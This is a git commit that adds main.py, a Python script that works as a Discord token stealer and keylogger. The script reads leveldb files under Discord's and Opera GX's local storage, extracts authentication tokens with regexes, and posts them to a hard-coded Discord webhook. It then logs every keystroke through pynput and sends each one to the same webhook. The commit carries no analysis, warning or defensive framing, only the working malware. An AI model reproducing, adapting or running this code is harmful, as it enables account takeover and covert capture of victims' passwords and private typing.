24bd8f19a98796f5185aa4278adb631e062d597a
Mefred <119149690+Mefred@users.noreply.github.com>
2024-06-24 21:53:23 -0700

    Add files via upload

---
+++ main.py
@@ -0,0 +1,57 @@
+import requests
+from pynput import keyboard
+import os
+from re import findall
+
+ROAMING = os.getenv("APPDATA")
+path = ROAMING + "\\Discord"
+
+path += "\\Local Storage\\leveldb"
+tokens = []
+for file_name in os.listdir(path):
+    if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
+        continue
+    for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
+        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+            for token in findall(regex, line):
+                tokens.append(token)
+path = ROAMING + "\\Opera Software\\Opera GX Stable"
+path += "\\Local Storage\\leveldb"
+for file_name in os.listdir(path):
+    if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
+        continue
+    for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
+        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+            for token in findall(regex, line):
+                tokens.append(token)
+url = "https://discord.com/api/webhooks/1212539003543363594/X7uvDlZW0NKmjTgXglFB3lJpsnSu75P_lymcg5KW_FKjVxsJr_xNqqEDKxdwEq5A8Fem"
+data = {
+        "content": str(tokens),
+        "username": "feb"
+}
+result = requests.post(url, json=data)
+
+
+def on_press(key):
+    try:
+        url = "https://discord.com/api/webhooks/1212539003543363594/X7uvDlZW0NKmjTgXglFB3lJpsnSu75P_lymcg5KW_FKjVxsJr_xNqqEDKxdwEq5A8Fem"
+        data = {
+            "content": key.char,
+            "username": "feb"
+        }
+        result = requests.post(url, json=data)
+    except:
+        return
+    try:
+        url = "https://discord.com/api/webhooks/1212539003543363594/X7uvDlZW0NKmjTgXglFB3lJpsnSu75P_lymcg5KW_FKjVxsJr_xNqqEDKxdwEq5A8Fem"
+        data = {
+            "content": key,
+            "username": "feb"
+        }
+        result = requests.post(url, json=data)
+    except:
+        return
+
+
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
